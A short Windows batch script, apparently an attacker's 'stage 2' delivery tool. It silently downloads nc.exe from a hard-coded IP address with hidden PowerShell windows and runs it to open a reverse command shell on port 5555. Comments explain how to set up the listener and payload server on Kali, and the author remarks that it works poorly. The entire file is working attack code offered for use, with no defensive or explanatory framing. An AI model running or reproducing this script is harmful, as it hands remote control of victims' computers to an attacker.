@echo off
set ncpath=%TEMP%\nc.exe
set ncaddr=192.168.31.186
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://%ncaddr%/nc.exe' -OutFile '%ncpath%'"
powershell -WindowStyle Hidden -Command "Start-Process '%ncpath%' -ArgumentList '%ncaddr% 5555 -e cmd' -WindowStyle Hidden"
:: remember its not a stager, its a stage 2 and ready to delivery stage 3 item.
:: Change IP Address before using it
:: Change filename
:: Before runing this Delivery Method start python server on port 80 and listen on run "nc -nvlp 5555" in kali
:: To be honest. It work like shit, dont use it. I wasted 6 hours on it, If you have any more reliable idea tell me.